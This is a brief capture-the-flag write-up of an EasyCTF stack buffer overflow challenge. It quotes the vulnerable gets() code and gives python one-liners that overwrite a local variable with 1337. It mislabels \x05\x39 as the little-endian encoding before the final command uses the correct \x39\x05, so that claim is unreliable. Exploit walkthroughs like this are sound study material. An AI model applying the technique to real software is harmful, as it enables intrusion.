Binary Exploitation

Buffering - 80 pts
-----------------

Problem info:

Can you overflow the stack? Try it at /problems/overflow1 on the EasyCTF shell server. The source is available at /problems/overflow1/overflow1.c, and the program you're trying to overflow is at /problems/overflow1/overflow1. Good luck!

On the sever we see  a C file called overflow.c, and it contains the source for the binary. Opening it up the buffer overflow is quite obvious
```C
    char buf[20];
    int x = 0;
    gets(buf);
    if (x == 1337) {

```
So, we need to write up the stack and insert the value of 1337. 1337 in hex is 539 
To encode this in little endian byte order we use:
```
\x05\x39
```
Now, we use trial and error to see where the buffer overflow
```zsh
(python -c "print 'A'*25) | ./overflow1
```
After trial and error we find the number to be 28, and so we send the proper input
```zsh
(python -c "print 'A'*28 + '\x39\x05'") | ./overflow1
```
There is the flag
```

```
